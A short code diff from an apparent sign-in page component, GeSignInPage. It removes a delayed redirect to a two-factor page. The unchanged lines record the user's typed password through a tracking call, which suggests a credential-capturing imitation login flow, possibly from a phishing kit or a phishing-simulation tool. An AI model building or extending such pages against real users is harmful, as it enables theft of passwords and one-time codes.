@@ -34,7 +34,6 @@ function GeSignInPage() {
           trackClick("Next-Password");
           trackInput("password", pw);
           setStep("loading");
-          setTimeout(() => geNavigate("/ge/twofa"), 3200);
         }
       } else if (m.type === "link") {
         trackClick(`Link:${m.text || m.href}`);
